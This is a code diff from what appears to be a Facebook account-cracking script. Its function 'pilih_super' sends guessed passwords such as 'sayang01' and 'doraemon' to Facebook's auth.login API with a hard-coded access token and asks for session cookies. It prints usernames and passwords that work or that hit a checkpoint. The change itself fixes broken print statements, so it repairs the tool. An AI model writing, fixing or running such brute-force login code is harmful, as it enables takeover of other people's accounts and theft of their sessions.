@@ -708,7 +708,7 @@ def pilih_super():
                                                                                    	 print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass7
                                                                                     else:
                                                                                     	if 'www.facebook.com' in q['error_msg']:
-                                                                           	             print \x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass7
+                                                                           	             print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass7
                                                                                         else:
                                                                            	                 pass8 = ('sayang') + '01'
                                                                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
@@ -717,7 +717,7 @@ def pilih_super():
                                                                                                 	print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass8
                                                                                                 else:
                                                                                                 	if 'www.facebook.com' in q['error_msg']:
-                                                                                                    	print \x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass8
+                                                                                                    	print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass8
                                                                                                     else:
                                                                                                         	pass9 = ('doraemon')
                                                                                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
@@ -726,7 +726,7 @@ def pilih_super():
                                                                                                             	print '\x1b[1;97m[\x1b[1;92m\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass9
                                                                                                             else:
                                                                                                             	if 'www.facebook.com' in q['error_msg']:
-                                                                                                            	    print \x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass9
+                                                                                                            	    print '\x1b[1;97m[\x1b[1;93m\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass9
                                                                                                 
                                                                            
                      
